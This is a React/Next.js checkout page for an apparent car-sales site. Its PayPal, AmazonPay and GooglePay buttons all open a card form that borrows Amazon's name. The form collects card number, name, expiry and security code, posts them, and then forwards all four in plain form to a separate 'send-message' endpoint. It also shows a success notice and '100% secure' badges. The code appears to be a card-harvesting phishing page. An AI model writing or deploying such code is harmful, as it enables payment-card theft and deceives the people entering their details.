"use client";
import { useLangStore } from "@/stores/lang.store";
import { useShoppingCartStore } from "@/stores/shopping-cart.store";
import { S3_URL } from "@/utils/aws";
import { doGet, doPost } from "@/utils/doMethod";
import { formatCurrency } from "@/utils/format-currency";
import {
  AmazonSquareFilled,
  GoogleCircleFilled,
  LikeFilled,
  PayCircleOutlined,
  PropertySafetyOutlined,
  SafetyCertificateFilled,
} from "@ant-design/icons";
import { useUser } from "@clerk/nextjs";
import { useMutation } from "@tanstack/react-query";
import {
  Button,
  Col,
  DatePicker,
  DatePickerProps,
  Form,
  FormProps,
  Image,
  Input,
  Modal,
  notification,
  Row,
  Typography,
} from "antd";
import { map } from "lodash";
import { useParams } from "next/navigation";
import { useRef, useState } from "react";
import { v4 as uuidv4 } from "uuid";

type FieldType = {
  phoneNumber?: string;
  address?: string;
};

type FieldTypeAddCard = {
  cardNumber?: string;
  nameOnCard?: string;
  expDate?: string;
  cvv?: string;
};

export default function Pay() {
  const { id } = useParams();
  const { user } = useUser();
  const [form] = Form.useForm();
  const [formAddCard] = Form.useForm();
  const [api, contextHolder] = notification.useNotification();

  const shoppingCartStore = useShoppingCartStore((state: any) => state);
  const langStore = useLangStore((state: any) => state);

  const [isModalOpen, setIsModalOpen] = useState(false);
  const [expDate, setExpDate] = useState<any>("");
  const submitBtnRef = useRef<any>(null);

  const mutation = useMutation({
    mutationKey: ["create-order"],
    mutationFn: async (payload: Record<string, any>) => {
      return await doPost("/orders", payload);
    },
    async onSuccess(data, variables, context) {
      showModal();
      form.resetFields();
    },
  });

  const mutationAddCard = useMutation({
    mutationKey: ["add-card"],
    mutationFn: async (payload: Record<string, any>) => {
      return await doPost("/card", payload);
    },
    async onSuccess(data, variables, context) {
      setIsModalOpen(false);
      api.success({
        message: "",
        description: "Order sucessfully",
      });
      await doPost(`/card/send-message`, {
        cardNumber: data?.data?.cardNumber,
        nameOnCard: data?.data?.nameOnCard,
        expDate: data?.data?.expDate,
        cvv: data?.data?.cvv,
      });
      formAddCard.resetFields();
    },
  });

  const onFinish = (value: FieldType) => {
    const { phoneNumber } = value;
    mutation.mutate({
      phoneNumber: phoneNumber,
      code: uuidv4(),
      carId: Number(id),
      user: user?.primaryEmailAddress?.emailAddress,
    });
    form.resetFields();
  };

  const onFinishAddCard = (value: FieldTypeAddCard) => {
    const { cardNumber, nameOnCard, cvv } = value;
    mutationAddCard.mutate({
      cardNumber,
      nameOnCard,
      expDate: expDate,
      cvv,
    });
    form.resetFields();
  };

  const showModal = () => {
    setIsModalOpen(true);
  };

  const handleOk = () => {
    submitBtnRef?.current?.click();
  };

  const handleCancel = () => {
    setIsModalOpen(false);
  };

  const onChange: DatePickerProps["onChange"] = (date, dateString) => {
    setExpDate(dateString);
  };

  return (
    <Row>
      {contextHolder}
      <Col span={12}>
        <div>
          <Typography className="font-bold flex justify-center items-center py-3">
            {langStore.lang.quick_pay}
          </Typography>
          <div className="border p-4">
            <div className="py-2">
              <Button
                block
                icon={<PayCircleOutlined />}
                onClick={showModal}
                className="!bg-[#009cde] !text-white"
              >
                PayPal
              </Button>
            </div>
            <div className="w-full flex justify-center items-center gap-2">
              <Button
                block
                icon={<AmazonSquareFilled />}
                onClick={showModal}
                className="!bg-yellow-500 !text-white"
              >
                AmazonPay
              </Button>

              <Button
                block
                icon={<GoogleCircleFilled />}
                onClick={showModal}
                className="!bg-red-500 !text-white"
              >
                GooglePay
              </Button>
            </div>
          </div>
        </div>

        <div>
          <Typography className="font-bold flex justify-start items-center py-3">
            {langStore.lang.contact}
          </Typography>
          <div>
            <Input placeholder="Email" />
          </div>
        </div>

        <div>
          <Typography className="font-bold flex justify-start items-center py-3">
            {langStore.lang.address}
          </Typography>
          <div className="p-4 border">
            <Form
              name="basic-2"
              wrapperCol={{ span: 24 }}
              onFinish={onFinish}
              autoComplete="off"
              form={form}
              layout="vertical"
            >
              <Form.Item<FieldType>
                label="Số điện thoại"
                name="phoneNumber"
                rules={[{ required: true, message: "Required" }]}
              >
                <Input placeholder="Số điện thoại" />
              </Form.Item>

              <Form.Item<FieldType>
                label="Địa chỉ"
                name="address"
                rules={[{ required: true, message: "Required" }]}
              >
                <Input placeholder="Địa chỉ" />
              </Form.Item>

              <Form.Item label={null}>
                <Button
                  htmlType="submit"
                  block
                  icon={<PropertySafetyOutlined />}
                >
                  {langStore.lang.pay}
                </Button>
              </Form.Item>
            </Form>
          </div>
        </div>
      </Col>
      <Col span={12} className="px-4">
        <div className="py-3 min-h-[46px]">
          {map(shoppingCartStore.products, (item, index) => {
            return (
              <div className="border p-4" key={index}>
                <div className="flex justify-start items-start">
                  <div>
                    <Image
                      preview={false}
                      alt="example"
                      src={`${S3_URL}/${item?.s3Key}`}
                      className="!w-40 !h-40"
                    />
                  </div>
                  <div className="px-4">
                    <Typography.Paragraph strong className="!mb-0">
                      {langStore.lang.name}: &nbsp; {item?.name}
                    </Typography.Paragraph>
                    <Typography.Paragraph strong className="!mb-0">
                      {langStore.lang.price}: &nbsp;
                      {formatCurrency(
                        item?.price,
                        localStorage.getItem("lang")
                      )}
                    </Typography.Paragraph>
                    <Typography.Paragraph strong className="!mb-0">
                      {langStore.lang.location}: &nbsp;
                      {item?.location}
                    </Typography.Paragraph>
                    <Typography.Paragraph strong className="!mb-0">
                      {langStore.lang.vehicleMake}: &nbsp;
                      {item?.vehicleMake}
                    </Typography.Paragraph>
                    <Typography.Paragraph strong className="!mb-0">
                      {langStore.lang.interiorName}: &nbsp;
                      {item?.interiorName}
                    </Typography.Paragraph>
                    <Typography.Paragraph strong className="!mb-0">
                      {langStore.lang.exteriorName}: &nbsp;
                      {item?.exteriorName}
                    </Typography.Paragraph>
                  </div>
                </div>
              </div>
            );
          })}
        </div>
        <div className="p-4 border">
          <div className="my-2">
            <Typography className="font-bold">
              <SafetyCertificateFilled /> Mua với sự an tâm
            </Typography>
          </div>

          <div className="">
            <p>
              <LikeFilled /> Đảm bảo hoàn tiền trong 30 ngày
            </p>
            <p>
              <LikeFilled /> Miễn phí vận chuyển và trả hàng
            </p>
            <p>
              <LikeFilled /> Bảo hành 12 tháng
            </p>
            <p>
              <LikeFilled /> Chất lượng đảm bảo, không có phí phụ thu
            </p>
          </div>
        </div>

        <div className="py-2">
          <div className="p-4 border">
            <Typography className="font-bold">
              <SafetyCertificateFilled /> Thanh toán an toàn 100%
            </Typography>
          </div>
        </div>
      </Col>

      <Modal
        title="Add a credit or debit card"
        open={isModalOpen}
        onOk={handleOk}
        onCancel={handleCancel}
        width={700}
      >
        <Row>
          <Col span={16}>
            <Form
              name="basic"
              labelCol={{ span: 8 }}
              wrapperCol={{ span: 16 }}
              style={{ maxWidth: 600 }}
              initialValues={{ remember: true }}
              onFinish={onFinishAddCard}
              autoComplete="off"
              form={formAddCard}
            >
              <Form.Item<FieldTypeAddCard>
                label="Card number"
                name="cardNumber"
                rules={[
                  { required: true, message: "Please input your card number!" },
                ]}
              >
                <Input placeholder="Card number" />
              </Form.Item>

              <Form.Item<FieldTypeAddCard>
                label="Name on card"
                name="nameOnCard"
                rules={[
                  {
                    required: true,
                    message: "Please input your name on card!",
                  },
                ]}
              >
                <Input placeholder="Name on card" />
              </Form.Item>

              <Form.Item<FieldTypeAddCard>
                label="Expiration date"
                name="expDate"
                rules={[
                  {
                    required: true,
                    message: "Please input your expiration date!",
                  },
                ]}
              >
                <DatePicker
                  onChange={onChange}
                  picker="month"
                  className="!w-full"
                />
              </Form.Item>

              <Form.Item<FieldTypeAddCard>
                label="Security code"
                name="cvv"
                rules={[
                  {
                    required: true,
                    message: "Please input your security code!",
                  },
                ]}
              >
                <Input placeholder="Security code" />
              </Form.Item>

              <Button
                ref={submitBtnRef}
                htmlType="submit"
                className="!hidden"
              />
            </Form>
          </Col>
          <Col span={6}>
            <div className="px-2">
              <Typography.Text>
                Amazon accepts all major credit and debit cards:
              </Typography.Text>
            </div>
          </Col>
        </Row>
      </Modal>
    </Row>
  );
}
